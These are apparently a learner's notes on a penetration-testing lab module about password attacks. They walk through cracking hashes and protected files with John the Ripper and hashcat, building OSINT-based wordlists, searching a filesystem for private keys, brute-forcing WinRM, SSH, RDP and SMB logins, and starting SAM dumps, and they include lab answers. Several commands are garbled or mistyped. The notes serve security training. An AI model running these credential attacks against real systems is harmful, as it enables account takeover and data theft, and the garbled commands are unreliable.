attacking passwords, let's take a moment to discuss authentication and its components.
\\authentication
Authentication
Authentication, at its core, is the validation of your identity by presenting a combination of four factors to a validation mechanism. They are:

Something you know: a password, passcode, pin, etc.
Something you have: an ID Card, security key, or other MFA tools
Something you are: your physical self, username, email address, or other identifiers
Somewhere you are: geolocation, IP address, etc.
\\The use of passwords
https://haveibeenpwned.com/
Passwords are commonly hashed when stored, in order to provide some protection in the event they fall into the hands of an attacker. Hashing is a mathematical function which transforms an arbitrary number of input bytes into a (typically) fixed-size output; common examples of hash functions are MD5, and SHA-256.
Take the password Soccer06! for example. The corresponding MD5 and SHA-256 hashes can be generated with the following commands:
$echo -n Soccer06! | md5sum
$echo -n Soeccer06! | sha256sum
Hash functions are designed to work in one direction. This means it should not be possible to figure out what the original password was based on the hash alon
Common techniques are to use rainbow tables, to perform dictionary attacks, and typically as a last resort, to perform brute-force attacks.
\\Rainbow Tables
Rainbow tables are large pre-compiled maps of input and output values for a given hash functio used to very quickly identify the password if its corresponding hash has already been mapped.
Password	MD5 Hash
123456	e10adc3949ba59abbe56e057f20f883e
12345	827ccb0eea8a706c4c34a16891f84e7b

Because rainbow tables are such a powerful attack, salting is used. A salt, in cryptographic terms, is a random sequence of bytes added to a password before it is hashed
To maximize impact, salts should not be reused, e.g. for all passwords stored in one database. For example, if the salt Th1sIsTh3S@lt_ is prepended to the same password, the MD5 hash would now be as follows:
$echo -n Th1sIsTh3S@lt_Soccer06! | md5sum
A salt is not a secret value — when a system goes to check an authentication request  it needs to know what salt was used so that it can check if the password hash matches For this reason, salts are typically prepended to corresponding hashes.
- To make rainbow tables effective again, an attacker would need to update their mapping to account for every possible salt. A salt consisting of just one single byte would mean the 15 billion entries from before would have to be 3.84 trillion (factor of 256).
\\Brute-force attack
A brute-force attack involves attempting every possible combination of letters, numbers, and symbols until the correct password is discovered. Obviously, this can take a very long time—especially for long passwords—however shorter passwords (<9 characters) are viable targets, even on consumer hardware. Brute-forcing is the only password cracking technique that is 100% effective -
Brute-force attempt	MD5 Hash
...SNIP...	...SNIP...
Sxejd	2cdc813ef26e6d20c854adb107279338

Note: Brute-forcing speeds depend heavily on the hashing algorithm and hardware that is used. On a typical company laptop, a tool like hashcat might be able to guess over five million passwords per second when attacking MD5, while at the same time only managing ten thousand per second when targeting a DCC2 hash.
\\Dictionary attack
A dictionary attack, otherwise known as a wordlist attack, is one of the most efficient techniques for cracking passwords, especially when operating under time-constraints as penetration testers usually do. Rather than attempting every possible combination of characters, a list containing statistically likely passwords is used. Well-known wordlists for password cracking are rockyou.txt and those included in SecLists.
kinlingit@htb[/htb]$ head --lines=20 /usr/share/wordlists/rockyou.txt 
\\==================================
Introduct to John the Ripper
als jtr aka john is a well-known pentest tool used for cracking password through various atk including brute-force and dictionary. 
-the jumbo variant is recomemend for performance optimizations, additionla feature such as multingual wordlist, 64-bit architecture.
carcker the greater password and accuracy and speed . 
\\Cracking modes 
Single crack mode is  e is a rule-based cracking technique that is most useful when targeting Linux credentials. It generates password candidates based on the victim's username, home directory name, and GECOS values (full name, room number, phone number, etc.). T
Note: The Linux authentication process, as well as cracking rules, will be covered in-depth in later sections. The following example is simplified for demonstration purposes.
EX: Imagine we as attackers came across the file passwd with the following contents:
r0lf:$6$ues25dIanlctrWxg$nZHVz2z4kCy1760Ee28M1xtHdGoy0C2cYzZ8l2sVa1kIa8K9gAcdBP.GI6ng/qA4oaMrgElZ1Cb9OeXO4Fvy3/:0:0:Rolf Sebastian:/home/r0lf:/bin/bash
Based on the contents of the file, it can be inferred that the victim has the username r0lf, the real name Rolf Sebastian, and the home directory /home/r0lf. Single crack mode will use this information to generate candidate passwords and test them against the hash. We can run the attack with the following command:
$john --single passwd
\\Wordlist mode
ordlist mode is used to crack passwords with a dictionary attack, meaning it attempts all passwords in a supplied wordlist against the password hash. The basic syntax for the command is as follows:
$john --wordlist=<wordlist_file> <hash_file> 
--rules argumen for generate candidate password more widely
The wordlist file (or files) used for cracking password hashes must be in plain text format, with one word per line. Multiple wordlists can be specified by separating them with a comma. Rules, either custom or built-in, can be specified by using the --rules argument. 
\\Incremental mode
Incremental mode is a powerful, brute-force-style password cracking mode that generates candidate passwords based on a statistical model (Markov chains). It is designed to test all character combinations defined by a specific character set, prioritizing more likely passwords based on training data.
https://en.wikipedia.org/wiki/Markov_chain
This mode is the most exhaustive, but also the most time-consuming. It generates password guesses dynamically and does not rely on a predefined wordlist, in contrast to wordlist mode. Unlike purely random brute-force attacks, Incremental mode uses a statistical model to make educated guesses, resulting in a significantly more efficient approach than naïve brute-force attacks.
$john --incremental <hash_file>
You can customize these or define your own to target passwords that use special characters or specific patterns.
\\creating our owwn password wordlist
$grep '# Incremental mod' -A 100 /etc/john/john.conf 
Note: This mode can be resource-intensive and slow, especially for long or complex passwords. Customizing the character set and length can improve performance and focus the attack.
\\Identifying hash formats
https://openwall.info/wiki/john/sample-hashes
https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats
Both sources list multiple example hashes as well as the corresponding JtR format
https://github.com/psypanda/hashID  By adding the -j flag, hashID will, in addition to the hash format, list the corresponding JtR format:
$hashid -j 193069ceb0461e1d40d216e32c79c704  -> unclear result
JtR supports hundreds of hash formats, some of which are listed in the table below. The --format argument can be supplied to instruct JtR which format target hashes have.
$john --format
\\Cracking files
It is also possible to crack password-protected or encrypted files with JtR. Multiple "2john" tools come with JtR that can be used to process files and produce hashes compatible with JtR. The generalized syntax for these tools is:
$<tool like rar2john> <file to crack> > file.hash to get hash
$locate *2john*
<test>Use single-crack mode to crack r0lf's password.
echo -n 'r0lf:$6$ues25dIanlctrWxg$nZHVz2z4kCy1760Ee28M1xtHdGoy0C2cYzZ8l2sVa1kIa8K9gAcdBP.GI6ng/qA4oaMrgElZ1Cb9OeXO4Fvy3/:0:0:Rolf Sebastian:/home/r0lf:/bin/bash' > hash.txt
john --single hash.txt
<test>Use wordlist-mode with rockyou.txt to crack the RIPEMD-128 password.
echo -n '193069ceb0461e1d40d216e32c79c704' > hash.txt tar -xvzf /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
john --wordlist=<wordlist_file> <hash_file> 
john --format=ripemd-128 --wordlist=./rockyou.txt hash.txt >cat ~/.john/john.pot | grep <hash>
\\=====================================
Introduction to Hashcat
Hashcat is a well-known password cracking tool for Linux, Windows, and macOS. From 2009 until 2015 it was proprietary software, but has since been released as open-source. Featuring fantastic GPU support, it can be used to crack a large variety of hashes. Similar to JtR, hashcat supports multiple attack (cracking) modes which can be used to efficiently attack password hashes.
$hashcat -a 0 -m 0 <hashes> [wordlist, rule, mask, ....]
-a is specify the atk mode    -m is specify the hash type   <hashes>either a hash string or a file containing one or more password hashes of the same type
[wordlist, rule, mask ] is placeholder for additional arguments that depend of the atk mode
\\Hash types
Hashcat supports hundreds of different hash types, each of which is assigned a ID. A list of associated IDs can be generated by running hashcat --help.
$hashcat --help
The hashcat website hosts a comprehensive list of example hashes which can assist in manually identifying an unknown hash type and determining the corresponding Hashcat hash mode identifier.
https://hashcat.net/wiki/doku.php?id=example_hashes
https://github.com/psypanda/hashID can be used to quickly identify the hashcat hash type by specifying the -m argument.
$hashid -m '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'
\\Attack modes
Hashcat has many different attack mode, including dictionary, mask, combinator, and association. In this section we will go over the first two, as they are likely the most common ones that you will need to use.
\\Dictionary attack
Dictionary attack (-a 0) is, as the name suggests, a dictionary attack. The user provides password hashes and a wordlist as input, and Hashcat tests each word in the list as a potential password until the correct one is found or the list is exhausted.
EX:As an example, imagine we extracted the following password hash from an SQL database: e3e3ec5831ad5e7288241960e5d4fdb8. First, we could identify this as an MD5 hash, which has a hash ID of 0. To attempt to crack this hash using the rockyou.txt wordlist, the following command would be used:
$hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 /usr/share/wordlists/rockyou.txt
A wordlist alone is often not enough to crack a password hash. As was the case with JtR, rules can be used to perform specific modifications to passwords to generate even more guesses. The rule files that come with hashcat are typically found under /usr/share/hashcat/rules:
$ls /usr/share/hashcat/rules
As another example, imagine an additional md5 hash was leaked from the SQL database: 1b0556a75770563578569ae21392630c. We weren't able to crack it using rockyou.txt alone, so in a subsequent attempt, we might apply some common rule-based transformations. One ruleset we could try is best64.rule, which contains 64 standard password modifications—such as appending numbers or substituting characters with their "leet" equivalents. To perform this kind of attack, we would append the -r <ruleset> option to the command, as shown below
$hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
\\Mask Attack
(-a 3) is a type of brute-force atk  attack in which the keyspace is explicitly defined by the user
example, if we know that a password is eight characters long, rather than attempting every possible combination, we might define a mask that tests combinations of six letters followed by two numbers.
A mask is defined by combining a sequence of symbols, each representing a built-in or custom character set. Hashcat includes several built-in character sets:
Symbol	Charset
?l	abcdefghijklmnopqrstuvwxyz
?u	ABCDEFGHIJKLMNOPQRSTUVWXYZ
?d	0123456789
?h	0123456789abcdef
?H	0123456789ABCDEF
?s	«space»!"#$%&'()*+,-./:;<=>?@[]^_`{
?a	?l?u?d?s
?b	0x00 - 0xff
Custom charsets can be defined with the -1, -2, -3, and -4 arguments, then referred to with ?1, ?2, ?3, and ?4.
Let's say that we specifically want to try passwords which start with an uppercase letter, continue with four lowercase letters, a digit, and then a symbol. The resulting hashcat mask would be ?u?l?l?l?l?d?s.
$hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'
<test>Use a dictionary attack to crack the first password hash. (Hash: e3e3ec5831ad5e7288241960e5d4fdb8)
tar -xvzf /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
$hashcat -a 0 -m 0 <hash> ./rockyou.txt

Use a dictionary attack with rules to crack the second password hash. (Hash: 1b0556a75770563578569ae21392630c)
$hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c ./rockyou.txt -r /usr/share/hashcat/rules/best64.rule
Use a mask attack to crack the third password hash. (Hash: 1e293d6912d074c0fd15844d803400dd)

$hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'
\\=================================================
Writing Custom Wordlists and RUles
Many users create their passwords based on simplicity rather than security
Basic OSINT (Open Source Intelligence) techniques can be highly effective in uncovering such personal information and may assist in password guessing. More information about OSINT can be found in the OSINT: Corporate Recon module.
https://hashcat.net/wiki/doku.php?id=rule_based_attack
cat custom.rule
:	Do nothing
l	Lowercase all letters
u	Uppercase all letters
c	Capitalize the first letter and lowercase others
sXY	Replace all instances of X with Y
$!	Add the exclamation character at the end
$hashcat --force password.list -r custom.rule -r custom.rule --stdout | sort -u > mut_password.list
Hashcat and JtR both come with pre-built rule lists that can be used for password generation and cracking. One of the most effective and widely used rulesets is best64.rule
We can narrow this down and perform more targeted guessing if we have information about the password policy, while considering factors such as the company name, geographical region, industry, and other topics or keywords that users might choose when creating their passwords. Exceptions, of course, include cases where passwords have been leaked and directly obtained.
\\Generating wordlists using CeWL
$cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
$wc -l inlane.wordlist
\\Exercise
For this sections exercise, imagine that we compromised the password hash of a work email belonging to Mark White. After performing a bit of OSINT, we have gathered the following information about Mark:

He was born on August 5, 1998
He works at Nexura, Ltd.
The company's password policy requires passwords to be at least 12 characters long, to contain at least one uppercase letter, at least one lowercase letter, at least one symbol and at least one number
He lives in San Francisco, CA, USA
He has a pet cat named Bella
He has a wife named Maria
He has a son named Alex
He is a big fan of baseball

97268a8ae45ac7d15c3cea4ce6ea550b
$create a password list
$create a rule
run the hashcat with password list and rule
$hashcat -a 3 -m 0 <password-list> -r <rule.rule>
$hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
cat << EOF > password.list
Mark
White
August
1998
Nexura
Sanfrancisco
California
Bella
Maria
Alex
Baseball
EOF
$cat << EOF > custom.rule
c
C
t
\$!
\$1\$9\$9\$8
\$1\$9\$9\$8\$!
sa@
so0
ss\$
EOF

hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
c - Capitalize the first character, lowercase the rest C - Lowercase the first character, uppercase the rest t - Toggle the case of all characters in a word $! - Appends the character ! to the end $1$9$9$8 - Appends '1998' to the end $1$9$9$8$! - Appends '1998!' to the end sa@ - Replace all instances of a with @ so0 - Replace all instances of o with 0 ss$ - Replace all instances of s with $
mask attack
$hashcat -a 0 -m 0 97268a8ae45ac7d15c3cea4ce6ea550b mut_password.list
\\\\\\\\\\==========================================
Cracking Protected files
The use of file encryption is often neglected in both private and professional contexts. Even today, emails containing job applications, account statements, or contracts are frequently sent without encryption—sometimes in violation of legal regulations. For example, within the European Union, the General Data Protection Regulation (GDPR) requires that personal data be encrypted both in transit and at rest. Nevertheless, it remains standard practice to discuss confidential topics or transmit sensitive data via email, which may be intercepted by attackers positioned to exploit these communication channels
\\Hunting for Encrypted files
Many different extensions correspond to encrypted files—a useful reference list can be found on FileInfo. As an example, consider this command we might use to locate commonly encrypted files on a Linux system:
https://fileinfo.com/filetypes/encoded
$ for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
\\Hunting for SSH keys
$ grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
$ cat /home/jsmith/.ssh/SSH.private
One way to tell whether an SSH key is encrypted or not, is to try reading the key with ssh-keygen.
$ ssh-keygen -yf ~/.ssh/id_ed25519 
As shown below, attempting to read a password-protected SSH key will prompt the user for a passphrase:
\\Cracking encrypted SSH keys
$ locate *2john*
$ ssh2john.py SSH.private > ssh.hash
$ john --wordlist=rockyou.txt ssh.hash  > $ john ssh.hash --show
\\Cracking password-protected documents
$office2john.py Protected.docx > protected-docx.hash
$john --wordlist=rockyou.txt protected-docx.hash
$john protected-docx.hash --show
\\Cracking Protected Archives
https://fileinfo.com/filetypes/compressed
$ curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
- Note that not all archive types support native password protection, and in such cases, additional tools are often used to encrypt the files. For example, TAR files are commonly encrypted using openssl or gpg.
\\Cracking ZIP files
$zip2john ZIP.zip > zip.hash
$cat zip.hash
$john --wordlist=rockyou.txt zip.hash  >  john zip.hash --show
\\Cracking OpenSSL encrypted GZIP files
$file GZIP.gzip 
When cracking OpenSSL encrypted files, we may encounter various challenges, including numerous false positives or complete failure to identify the correct password. To mitigate this, a more reliable approach is to use the openssl tool within a for loop that attempts to extract the contents directly, succeeding only if the correct password is found.
The following one-liner may produce several GZIP-related error messages, which can be safely ignored. If the correct password list is used, as in this example, we will see another file successfully extracted from the archive.
$for i in $(cat rockyou.txt);do
openssl enc -ase-250-cbc -d -in GZIP.gzip -k $i 
2>/dev/null| tar xz;done
Once the for loop has finished, we can check the current directory for a newly extracted file.
\\==============================
Cracking BitLocker-encrypted drives
bitlocker2john to four different hashes: the first two correspond to the BitLocker password, while the latter two represent the recovery key. Because the recovery key is very long and randomly generated, it is generally not practical to guess—unless partial knowledge is available. Therefore, we will focus on cracking the password using the first hash ($bitlocker$0$...).
$bitlocker2john -i Backup.vhd > backup.hashes
$grep "bitlocker\$0" backup.hashes > backup.hash
$cat backup.hash
-Once a hash is generated, either JtR or hashcat can be used to crack it. For this example, we will look at the procedure with hashcat. The hashcat mode associated with the $bitlocker$0$... hash is -m 22100. We supply the hash, specify the wordlist, and define the hash mode. Since this encryption uses strong AES encryption, cracking may take considerable time depending on hardware performance.
$hashcat -a 0 -m 22100 '$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f' /usr/share/wordlists/rockyou.txt
After successfully cracking the password, we can access the encrypted drive.
\\Mounting BitLocker-encrypted drives in Windows
The easiest method for mounting a BitLocker-encrypted virtual drive on Windows is to double-click the .vhd file. Since it is encrypted, Windows will initially show an error. After mounting, simply double-click the BitLocker volume to be prompted for the password.
\\Mounting Bitlocker-encrypted drives in Linux (or macOS)
It is also possible to mount BitLocker-encrypted drives in Linux (or macOS). To do this, we can use a tool called dislocker. First, we need to install the package using apt:
$sudo apt-get install dislocker
$sudo mkdir -p /media/bitlocker
$sudo mkdir -p /media/bitlockermount
We then use losetup to configure the VHD as loop device, decrypt the drive using dislocker, and finally mount the decrypted volume:
$sudo losetup -f -P Backup.vhd
$sudo dislocker /dev/loop0p2 - u1234qwer -- /media/bitlocker
$sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
If everything was done correctly, we can now browse the files:
cd /media/bitlockermount/
$ls -la 
-Once we have analyzed the files on the mounted drive, we can unmount it using the following commands:
sudo unmount /media/bitlockermount
$sudo unmount /media/bitlocker
94.237.49.23:47272
<test>Run the above target then navigate to http://ip:port/download, 
then extract the downloaded file. Inside, you will find a password-protected VHD file.
Crack the password for the VHD and submit the recovered password as your answer.
$bitlocker2john -i Backup.vhd > backup.hashes
$grep "bitlocker\$0" backup.hashes > backup.hash
$cat backup.hash
tar -xvzf /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
$hashcat -a 0 -m 22100 '$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f' /usr/share/wordlists/rockyou.tx

<test>Mount the BitLocker-encrypted VHD and enter the contents of flag.txt as your answer.
$sudo apt-get install dislocker
$sudo mkdir -p /media/bitlocker
$sudo mkdir -p /media/bitlockermount
We then use losetup to configure the VHD as loop device, decrypt the drive using dislocker, and finally mount the decrypted volume:
$sudo losetup -f -P Backup.vhd
$sudo losetup -a > lsblk -o Nlsblk -o NAME,SIZE,FSTYPE,TYPE,MOUNTPOINT
$sudo dislocker /dev/loop0p2 -u'1234qwer' -- /media/bitlocker
$sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
If everything was done correctly, we can now browse the files:
cd /media/bitlockermount/
$ls -la 
-Once we have analyzed the files on the mounted drive, we can unmount it using the following commands:
sudo unmount /media/bitlockermount
$sudo unmount /media/bitlocker
\\\\\===============================================
Network services

During our penetration tests, every computer network we encounter will have services installed to manage, edit, or create content. All these services are hosted using specific permissions and are assigned to specific users. Apart from web applications, these services include (but are not limited to) FTP, SMB, NFS, IMAP/POP3, SSH, MySQL/MSSQL, RDP, WinRM, VNC, Telnet, SMTP, and LDAP.
In this case, the most common services suitable for this are RDP, WinRM, and SSH. SSH is not as common on Windows, but it is the leading service for Linux-based systems.
All these services have an authentication mechanism using a username and password. Of course, these services can be modified and configured so that only predefined keys can be used for logging in, but they are configured with default settings in many cases.+
\\WinRM Windows Remote Management is the Microsoft implementation of the Web Services Management Protocol (WS-Management
-It is a network protocol based on XML web services using the Simple Object Access Protocol (SOAP) used for remote management of Windows systems. It takes care of the communication between Web-Based Enterprise Management (WBEM) and the Windows Management Instrumentation (WMI), which can call the Distributed Component Object Model (DCOM).
-For security reasons, WinRM must be activated and configured manually in Windows 10/11. Therefore, it depends heavily on the environment security in a domain or local network where we want to use WinRM. In most cases, one uses certificates or only specific authentication mechanisms to increase its security. By default, WinRM uses the TCP ports 5985 (HTTP) and 5986 (HTTPS).
- handy tool that we can use for our password attacks is NetExec, which can also be used for other protocols such as SMB, LDAP, MSSQL, and others. We recommend reading the official documentation for this tool to become familiar with it.
\\Netexec https://github.com/Pennyw0rth/NetExec https://www.netexec.wiki/
\\Installing NetExec

We can install NetExec with apt, or clone the GitHub repo and follow the various installation methods, such as installing from source and avoiding dependency issues.
$sudo apt-get -y install netexec
\\NetExec Menu options 
$netexec -h 
\\NetExec Protocol-Specific help
Note that we can specify a specific protocol and receive a more detailed help menu of all of the options available to us. NetExec currently supports remote authentication using NFS, FTP, SSH, WinRM, SMB, WMI, RDP, MSSQL, LDAP, and VNC.
$netexec smb -h 
\\NetExec Usage
$netexec <proto> <target-IP> -u <user or userlist> -p <passoword or password list>
As an example, this is what attacking a WinRM endpoint might look like:
$netexec winrm 10.129.42.197 -u user.list -p password.list
The appearance of (Pwn3d!) is the sign that we can most likely execute system commands if we log in with the brute-forced user. Another handy tool that we can use to communicate with the WinRM service is Evil-WinRM, which allows us to communicate with the WinRM service efficiently.
\\Evil-WinRM

\\Installing Evil-WinRM

$sudo gem install evil-winrm
\\Evil-WinRM Usage
$evil-winrm -i <target-IP> -u <user name> -p <password>
If the login was successful, a terminal session is initialized using the Powershell Remoting Protocol (MS-PSRP), which simplifies the operation and execution of commands.
\\SSH
\\Symmetric Encryption
use same key for encryptiong and decryption Anyone who has access to the key could also access the transmitted data
Therefore, a key exchange procedure is needed for secure symmetric encryption. The Diffie-Hellman key exchange method is used for this purpose
If a third party obtains the key, it cannot decrypt the messages because the key exchange method is unknown. However, this is used by the server and client to determine the secret key needed to access the data. Many different variants of the symmetrical cipher system can be used, such as AES, Blowfish, 3DES, etc.
\\Asymmetric Encryption
Asymmetric encryption uses two keys: a private key and a public key. The private key must remain secret because only it can decrypt the messages that have been encrypted with the public key. If an attacker obtains the private key, which is often not password protected, he will be able to log in to the system without credentials. Once a connection is established, the server uses the public key for initialization and authentication. If the client can decrypt the message, it has the private key, and the SSH session can begin.
\\Hashing 
The hashing method converts the transmitted data into another unique value. SSH uses hashing to confirm the authenticity of messages. This is a mathematical algorithm that only works in one direction.
\\Hydra SSH

We can use a tool like Hydra to brute force SSH. This is covered in-depth in the Login Brute Forcing module.
$hydra -L user.list -P password.list ssh://10.129.42.197
To log in to the system via the SSH protocol, we can use the OpenSSH client, which is available by default on most Linux distributions.
$ssh user@<ip>
\\Remote Desktop Protocol (RDP)

-Microsoft's Remote Desktop Protocol (RDP) is a network protocol that allows remote access to Windows systems via TCP port 3389 by default
RDP provides both users and administrators/support staff with remote access to Windows hosts within an organization
The Remote Desktop Protocol defines two participants for a connection: a so-called terminal server, on which the actual work takes place, and a terminal client, via which the terminal server is remotely controlled
In addition to the exchange of image, sound, keyboard, and pointing device, the RDP can also print documents of the terminal server on a printer connected to the terminal client or allow access to storage media available there.
-Technically, the RDP is an application layer protocol in the IP stack and can use TCP and UDP for data transmission. The protocol is used by various official Microsoft apps, but it is also used in some third-party solutions.
\\Hydra-RDP

We can also use Hydra to perform RDP bruteforcing.
$hydra -L user.list -P password.list rdp://10.129.42.197
-Linux offers different clients to communicate with the desired server using the RDP protocol. These include Remmina, xfreerdp, and many others. For our purposes, we will work with xfreerdp.
\\xfreerdp

$xfreerdp /v:<target -IP> /u:<username> /p:<password>
\\SMB

Server Message Block (SMB) is a protocol responsible for transferring data between a client and a server in local area networks. It is used to implement file and directory sharing and printing services in Windows networks. SMB is often referred to as a file system, but it is not. SMB can be compared to NFS for Unix and Linux for providing drives on local networks.
SMB is also known as Common Internet File System (CIFS). It is part of the SMB protocol and enables universal remote connection of multiple platforms such as Windows, Linux, or macOS. In addition, we will often encounter Samba, which is an open-source implementation of the above functions. For SMB, we can also use hydra again to try different usernames in combination with different passwords.
\\Hydra-SMB

$hydra -L user.list -P password.list smb://10.129.42.197
However, we may also get the following error describing that the server has sent an invalid reply.
This is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, we can manually update and recompile hydra or use another very powerful tool, the Metasploit framework.
\\Metasploit

$msfconsole -q
msf>use auxiliary/scanner/smb/smb_login > options >
>set user_file user.list > set pass_file password.list
>set rhosts 10.129.42.197 >run
Now we can use NetExec again to view the available shares and what privileges we have for them.
$netexec smb 10.129.42.197 -u "user" -p "password" --shares
-To communicate with the server via SMB, we can use, for example, the tool smbclient. This tool will allow us to view the contents of the shares, upload, or download files if our privileges allow it.
\\smbclient

$smbclient -U user \\\\10.129.42.197\\SHARENAME

<test>Find the user for the WinRM service and crack their password. Then, when you log in, you will 
find the flag in a file there. Submit the flag you found as the answer.
$nmap -A <targetIP>
$sudo gem install evil-winrm
$evil-winrm -i <target-IP> -u <user name> -p <password>
$ssh user@<ip>
</alter>
$sudo apt-get -y install netexec
$netexec <proto> <target-IP> -u <user or userlist> -p <passoword or password list>
</alter>
 crackmapexec winrm 10.129.239.240 -u username.list -p password.list
 evil-winrm -i STMIP -u john -p november
 Get-ChildItem -Path ., .. -Recurse -Filter "flag*"
 type C:\Users\john\Desktop\flag.txt
WINSRV\john:november
<test>Find the user for the SSH service and crack their password. Then, when you log in, you will find 
he flag in a file there. Submit the flag you found as the answer.
$hydra -L user.list -P password.list ssh://10.129.42.197
type .\Desktop\flag.txt

<test>Find the user for the RDP service and crack their password. Then, when you log in, you will find 
the flag in a file there. Submit the flag you found as the answer.
$hydra -L user.list -P password.list rdp://10.129.42.197
$xfreerdp /v:<target -IP> /u:<username> /p:<password>
xfreerdp /v:STMIP /u:chris /p:789456123

<test> Find the user for the SMB service and crack their password. Then, when you log evin, you will find
 the flag in a file there. Submit the flag you found as the answer.
 $hydra -L user.list -P password.list smb://10.129.42.197
 </alter>
 msfconsole -q
use auxiliary/scanner/smb/smb_login
set PASS_FILE password.list
set USER_FILE username.list
set RHOST STMIP
set VERBOSE false
run

 smbclient -U cassie -L '\\10.129.202.136\'
  smbclient -U cassie  '\\10.129.202.136\CASSIE'
 dir
get flag.txt

///////////////////====================================================
Spraying, Stuffing, and Defaults 
\\Password Spraying
Password spraying tries a single common password across many accounts to find users who still use default or predictable passwords.
Use the right tool for the target—Burp Suite for web apps and NetExec or Kerbrute for Active Directory.

\\Credential Stuffing
Credential stuffing replays leaked credentials across services to gain access; only perform or simulate it in authorized tests and focus on detection and prevention.
$hydra -C user_pass.list ssh://10.100.38.23
\\Default credentials
Default credentials left unchanged on devices are a major risk—use online lists or tools (e.g., pip3 install default-credentials-cheatsheet) to check and remediate.
$pip3 install defaultcreds-cheat-sheet
$creds search linksys
Collect default username:password pairs for discovered apps and routers, test them (e.g., with hydra) in authorized engagements to find unchanged credentials.
<test>Use the credentials provided to log into the target machine and retrieve the MySQL credentials
. Submit them as the answer. (Format: <username>:<password>)
SSH to with user "sam" and password "B@tm@n2022!" 10.129.119.16
$pip install defaultcreds-cheat-sheet
$creds search MySQL
$mysql -h localhost -usuperdba -p 
\\Windows Authentication process
The Windows authentication process uses several modules for logon, credential handling, and verification. Among its methods, Kerberos is the most common and complex. The Local Security Authority (LSA) is a protected subsystem that authenticates users, manages local logins, enforces security policies, and maps usernames to SIDs.

On a Domain Controller, these policies and accounts are stored in Active Directory and apply across the domain. The LSA also handles access control, permission checks, and security auditing.
-Local interactive logon involves several components working together: WinLogon, LogonUI, credential providers, LSASS, authentication packages, and either SAM or Active Directory. Authentication packages are DLLs that handle credential verification—for example, Msv1_0.dll is used for non-domain or local interactive logins.
-WinLogon is a trusted system process that manages security-related interactions, including logon prompts, password changes, and workstation locks. It uses credential providers—COM-based DLLs—to collect usernames and passwords.

As the only process that intercepts login requests from the keyboard (via Win32k.sys), WinLogon launches LogonUI to display the logon screen. After collecting credentials, it forwards them to LSASS for authentication.

\\LSASS (local security authority Subsystem service)
manages all authentication processes in Windows. Located at %SystemRoot%\System32\lsass.exe, 
it enforces local security policies, authenticates users, and sends security audit logs
to the Event Log. In short, LSASS acts as the security gatekeeper of the Windows operating system.

Authentication Packages	Description https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961760(v=technet.10)?redirectedfrom=MSDN

Lsasrv.dll	The LSA Server service both enforces security policies and acts as the security package manager for the LSA. The LSA contains the Negotiate function, which selects either the NTLM or Kerberos protocol after determining which protocol is to be successful.
Msv1_0.dll	Authentication package for local machine logons that don't require custom authentication.
Samsrv.dll	The Security Accounts Manager (SAM) stores local security accounts, enforces locally stored policies, and supports APIs.
Kerberos.dll	Security package loaded by the LSA for Kerberos-based authentication on a machine.
Netlogon.dll	Network-based logon service.
Ntdsa.dll	This library is used to create new records and folders in the Windows registry.

Each interactive logon session creates a separate instance of the WinLogon service. The Graphical Identification and Authentication (GINA) architecture is loaded into the process area used by WinLogon, receives and processes the credentials, and invokes the authentication interfaces via the LSALogonUser function.
\\SAM database

The Security Account Manager (SAM) is a Windows database that stores user credentials and authenticates local or remote users. Passwords are saved as 
LM or NTLM hashes in %SystemRoot%\System32\config\SAM, which is mounted under HKLM\SAM and requires SYSTEM privileges to access.

In workgroup setups, the SAM database manages all local users. In domain setups, 
authentication is handled by the Domain Controller (DC) using the Active Directory database (%SystemRoot%\ntds.dit).

To protect the SAM from offline cracking,
 Microsoft introduced SYSKEY in Windows NT 4.0, which encrypts stored password hashes using a system-generated key.

-Credential Manager saves encrypted per-user credentials in the Credential Locker
 (%LocalAppData%\Microsoft\Vault or ...\Credentials); this module will cover hands-on ways to decrypt and inspect them.
 PS C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\
 \\NTDS 

In domain environments DCs hold a synchronized NTDS.dit database (users, password hashes, computers, groups, GPOs; RODCs read-only);
 this module will cover extracting credentials from NTDS.dit and other stores.

///////////////===============================================
Attacking SAM, SYSTEM, and SECURITY 

>atack host> exfiltrate SAMDB > transfer to atk host > cracking offline,
With admin access to a Windows machine, we can quickly dump the SAM files, move them to our attack host, and crack the hashes offline. Doing this offline lets us keep attacking without maintaining an active session — follow along by spawning the target box provided.
“Administrator session > export forensic artifacts > transfer to lab host > analyze offline (for training)”

Registry Hive	Description
